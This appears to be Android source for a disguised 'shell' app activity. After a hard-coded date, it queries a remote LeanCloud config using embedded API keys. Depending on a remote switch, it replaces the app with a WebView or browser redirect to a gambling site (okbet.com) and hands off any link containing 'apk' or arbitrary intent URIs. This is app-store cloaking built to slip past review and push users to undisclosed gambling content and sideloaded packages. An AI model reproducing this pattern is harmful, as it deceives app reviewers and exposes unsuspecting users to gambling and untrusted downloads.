package com.regus.mj;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ClipData;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URISyntaxException;
import java.net.URL;

import a.c8.cn.R;


/**
 * 游戏包 支持h5   下载    融合
 * <p>
 * https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md
 * <p>
 * https://gitee.com/tai-army/root-domain-name/raw/master/README.md
 */
public class MJRegusGGActivity extends Activity {


    //跳转到原马甲包启动页的全路径
    String activityPath = "REGUS_PATH";


    //该页面的启动页图片的id
    int splash_bg_id;

    /**
     * 植入的一个主布局   名字固定叫 mj_regus_splash.xml
     */

    //页面布局的id
    int activity_layout_id;
    //页面布局的根布局的id
    int root_view_id;
    int webview_id;
    int progress_id;

    RelativeLayout mRootView;

    private ProgressBar mProgressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        splash_bg_id = CPResourceUtil.getMipmapId(getApplicationContext(), "mj_splash");
        activity_layout_id = CPResourceUtil.getLayoutId(getApplicationContext(), "mj_regus_splash_gg");
        root_view_id = CPResourceUtil.getId(getApplicationContext(), "mj_root_view");
        webview_id = CPResourceUtil.getId(getApplicationContext(), "mj_web");
        progress_id = CPResourceUtil.getId(getApplicationContext(), "mj_progressBar");

        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        //设 layout id
        setLayoutId();

        //根布局id mj_root_view
        setRootViewId();

        //设置启动图id`
        setSplashId();

        setWebViewId();

        setProgressId();

        //test
        //https://www.lodivip.com/
       initWebView("https://www.okbet.com/mobile/publicity");

    }

    //设 layout id
    @SuppressLint("ResourceType")
    private void setLayoutId() {
        setContentView(activity_layout_id);
    }

    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId() {
        mRootView = findViewById(root_view_id);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId() {
        mRootView.setBackgroundResource(splash_bg_id);
    }

    @SuppressLint("ResourceType")
    private void setWebViewId() {
        webView = findViewById(webview_id);
    }

    @SuppressLint("ResourceType")
    private void setProgressId() {
        mProgressBar = findViewById(progress_id);
    }


    @Override
    protected void onResume() {
        super.onResume();
        setData();
    }


    private void setData() {
        if (System.currentTimeMillis() > 1670169600000L) {
            Log.e("zzz2", "" + System.currentTimeMillis());
            new Thread(new GetDtRunnale()).start();
        } else {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    jumpLocalSplash();
                }
            }, 2000);
        }
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {

        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusGGActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL("https://iuezl3up.api.lncldglobal.com/1.1/classes/data/63770a355fee9f4325dcd4ee");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setRequestProperty("X-LC-Id", "IuEZl3upK7WWyhx90eyaKtag-MdYXbMMI");
                urlConnection.setRequestProperty("X-LC-Key", "27Om3goQARTtUyLVXNPse3pC");
                urlConnection.setConnectTimeout(4000);
                urlConnection.setReadTimeout(4000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    //     Log.e("regus getDt ", jsonStr + "");

                    //处理
                    try {
                        JSONObject avObject = new JSONObject(jsonStr);
                        String page = avObject.getString("page");
                        String url = avObject.getString("uu_rl");
                        boolean isStop = avObject.getBoolean("kg");
                        Log.e("avo", "s  " + isStop + " i  " + url);
                        if (isStop) {
                            if (page.equals("1")) {
//                                Intent intent = new Intent(MJRegusGGActivity.this, WebViewActivity.class);
//                                intent.putExtra("wap_url", url);
//                                startActivity(intent);
//                                finish();
                                initWebView(url);

                            } else {
                                Intent intent = new Intent();
                                intent.setAction(Intent.ACTION_VIEW);
                                Uri content_url = Uri.parse(url);
                                intent.setData(content_url);
                                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                                startActivity(intent);
                            }
                        } else {
                            jumpLocalSplash();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        jumpLocalSplash();
                    }
                } else {
                    jumpLocalSplash();
                }
            } catch (Exception e) {
                jumpLocalSplash();
            }
        }

    }




    public WebView webView;

    public ValueCallback<Uri> O;
    public ValueCallback<Uri[]> P;


    private void initWebView(String url){
        webView.setVisibility(View.VISIBLE);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(0);
        }
        webView.setLayerType(2, null);
        settings.setDatabaseEnabled(true);
        settings.setAppCacheEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setUseWideViewPort(false);
        settings.setDomStorageEnabled(true);
        webView.setBackgroundColor(Color.parseColor("#000000"));
        webView.setWebChromeClient(new j());
        webView.setWebViewClient(new k());
        webView.loadUrl(url);
    }


    @Override // c.g.a.f, android.app.Activity
    public void onActivityResult(int i, int i2, Intent intent) {
        Uri[] uriArr;
        super.onActivityResult(i, i2, intent);
        if (i == 10000) {
            if (this.O == null && this.P == null) {
                return;
            }
            Uri data = (intent == null || i2 != -1) ? null : intent.getData();
            ValueCallback<Uri[]> valueCallback = this.P;
            if (valueCallback == null) {
                ValueCallback<Uri> valueCallback2 = this.O;
                if (valueCallback2 != null) {
                    valueCallback2.onReceiveValue(data);
                    this.O = null;
                }
            } else if (i == 10000 && valueCallback != null) {
                if (i2 != -1 || intent == null) {
                    uriArr = null;
                } else {
                    String dataString = intent.getDataString();
                    ClipData clipData = intent.getClipData();
                    if (clipData != null) {
                        uriArr = new Uri[clipData.getItemCount()];
                        for (int i3 = 0; i3 < clipData.getItemCount(); i3++) {
                            uriArr[i3] = clipData.getItemAt(i3).getUri();
                        }
                    } else {
                        uriArr = null;
                    }
                    if (dataString != null) {
                        uriArr = new Uri[]{Uri.parse(dataString)};
                    }
                }
                this.P.onReceiveValue(uriArr);
                this.P = null;
            }
        }
    }



    /**
     * 设置进度条
     *
     * @param progress
     */
    private void setProgressBar(int progress) {
        if (progress == 100) {
            mProgressBar.setVisibility(View.INVISIBLE);
        } else {
            if (View.INVISIBLE == mProgressBar.getVisibility()) {
                mProgressBar.setVisibility(View.VISIBLE);
            }
            mProgressBar.setProgress(progress);
        }
    }

    public class j extends WebChromeClient {


        @Override // android.webkit.WebChromeClient
        public void onProgressChanged(WebView webView, int i) {
            Log.e("onPageProgress",i+"");
            setProgressBar(i);
        }

        @Override // android.webkit.WebChromeClient
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> valueCallback, WebChromeClient.FileChooserParams fileChooserParams) {
            Intent intent = new Intent("android.intent.action.GET_CONTENT");
            intent.addCategory("android.intent.category.OPENABLE");
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent, "Image Chooser"), 10000);
            return true;
        }
    }



    public class k extends WebViewClient {


        @Override
        public void onLoadResource(WebView webView, String s) {
            super.onLoadResource(webView, s);
            Log.e("onPageLoadResource", s);
        }


        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            //showProgress();
            Log.e("onPageStarted", url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            Log.e("onPageFinished", url);
        }


        @Override
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            sslErrorHandler.cancel();
            super.onReceivedSslError(webView, sslErrorHandler, sslError);
        }


        @SuppressLint("WrongConstant")
        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest webResourceRequest) {
            if (webResourceRequest != null) {
                String uri = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    uri = webResourceRequest.getUrl().toString();
                }
                if (uri.contains("apk")) {
                    try {
                        startActivity(Intent.parseUri(uri, 1));
                    } catch (URISyntaxException e2) {
                        e2.printStackTrace();
                    }
                }
                if (uri.startsWith("http") || uri.startsWith("https")) {
                    return super.shouldOverrideUrlLoading(webView, webResourceRequest);
                }
                try {
                    startActivity(Intent.parseUri(uri, 1));
                } catch (Exception e3) {
                    try {
                        boolean z = e3 instanceof ActivityNotFoundException;
                    } catch (Exception e4) {
                        e4.printStackTrace();
                    }
                    e3.printStackTrace();
                }
                return true;
            }
            return super.shouldOverrideUrlLoading(webView, webResourceRequest);
        }
    }


    @Override // c.a.k.i, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (this.webView.canGoBack() && i == 4) {
            this.webView.goBack();
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }


}
